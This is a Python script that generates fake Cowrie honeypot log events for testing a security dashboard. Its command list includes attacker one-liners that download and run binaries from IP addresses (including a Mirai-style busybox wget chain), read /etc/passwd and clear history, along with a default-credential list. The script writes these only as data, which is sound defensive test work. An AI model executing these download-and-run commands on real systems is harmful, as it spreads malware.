#!/usr/bin/env python3
"""Appends realistic fake Cowrie JSON events to a log file -- for local testing/demo of the
dashboard without needing real attack traffic. Point COWRIE_LOG_PATH at the same file and
run the backend to watch events show up live.
"""

import argparse
import json
import random
import time
import uuid
from datetime import datetime, timezone

# A mix of real public IPs across different countries/ASNs so GeoLite2 lookups produce variety.
SAMPLE_IPS = [
    "185.220.101.45", "185.220.101.52",  # DE
    "103.145.13.22", "103.145.13.9",     # IN
    "45.155.205.11", "45.155.205.45",    # NL
    "194.26.29.156",                     # RU
    "218.92.0.45", "218.92.0.112",       # CN
    "196.203.3.11",                      # EG
    "91.240.118.5",                      # UA
    "5.188.62.140",                      # RU
    "162.142.125.10",                    # US
    "112.85.42.89",                      # CN
    "89.248.165.32",                     # NL
]

USERNAMES = ["root", "admin", "user", "ubuntu", "test", "guest", "pi", "oracle", "postgres", "support", "ftpuser"]
PASSWORDS = ["123456", "password", "admin", "root", "toor", "12345678", "qwerty", "raspberry", "letmein", "changeme", "P@ssw0rd", ""]

COMMANDS = [
    "uname -a",
    "cat /proc/cpuinfo",
    "cat /etc/passwd",
    "wget http://45.155.205.11/bins/x86 -O /tmp/.x86 && chmod +x /tmp/.x86 && /tmp/.x86",
    "busybox wget http://185.220.101.45/mirai.arm -O /tmp/m; chmod 777 /tmp/m; /tmp/m",
    "echo root:$(openssl passwd -1 -salt xyz hunter2)",
    "history -c",
    "ls -la /",
    "ps aux",
    "curl -s http://checkip.amazonaws.com",
    "crontab -l",
    "/bin/busybox ECCHI",
]


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def make_event(eventid: str, src_ip: str, session: str, **extra) -> str:
    event = {
        "eventid": eventid,
        "timestamp": now_iso(),
        "src_ip": src_ip,
        "session": session,
        "sensor": "honeypot1",
        **extra,
    }
    return json.dumps(event)


def simulate_attack(log_file: str, src_ip: str) -> int:
    session = uuid.uuid4().hex[:8]
    lines = [
        make_event(
            "cowrie.session.connect", src_ip, session,
            src_port=random.randint(1024, 65000), dst_port=random.choice([22, 2222]),
            protocol="ssh", message="New connection",
        )
    ]

    for _ in range(random.randint(1, 4)):
        username = random.choice(USERNAMES)
        password = random.choice(PASSWORDS)
        lines.append(make_event(
            "cowrie.login.failed", src_ip, session,
            username=username, password=password,
            message=f"login attempt [{username}/{password}] failed",
        ))

    if random.random() < 0.35:
        username = random.choice(USERNAMES)
        password = random.choice(PASSWORDS)
        lines.append(make_event(
            "cowrie.login.success", src_ip, session,
            username=username, password=password,
            message=f"login attempt [{username}/{password}] succeeded",
        ))

        for _ in range(random.randint(1, 3)):
            cmd = random.choice(COMMANDS)
            lines.append(make_event(
                "cowrie.command.input", src_ip, session,
                input=cmd, message=f"CMD: {cmd}",
            ))

        if random.random() < 0.4:
            url = f"http://{random.choice(SAMPLE_IPS)}/payload{random.randint(1, 9)}"
            lines.append(make_event(
                "cowrie.session.file_download", src_ip, session,
                url=url, outfile=f"var/lib/cowrie/downloads/{uuid.uuid4().hex[:12]}",
                shasum=uuid.uuid4().hex + uuid.uuid4().hex,
                message=f"Downloaded URL ({url})",
            ))

    with open(log_file, "a", encoding="utf-8") as f:
        for line in lines:
            f.write(line + "\n")
        f.flush()

    return len(lines)


def main() -> None:
    parser = argparse.ArgumentParser(description="Simulate Cowrie attack traffic for dashboard testing")
    parser.add_argument("--log", default="./test_cowrie.json", help="Path to the test log file to append to")
    parser.add_argument("--interval", type=float, default=2.0, help="Average seconds between simulated attack sessions")
    parser.add_argument("--count", type=int, default=0, help="Number of attack sessions to simulate (0 = run forever)")
    args = parser.parse_args()

    print(f"Simulating Cowrie attacks -> {args.log} (Ctrl+C to stop)")
    n = 0
    try:
        while args.count == 0 or n < args.count:
            src_ip = random.choice(SAMPLE_IPS)
            written = simulate_attack(args.log, src_ip)
            n += 1
            print(f"[{n}] {src_ip}: wrote {written} events")
            time.sleep(random.uniform(args.interval * 0.4, args.interval * 1.6))
    except KeyboardInterrupt:
        print("\nStopped.")


if __name__ == "__main__":
    main()
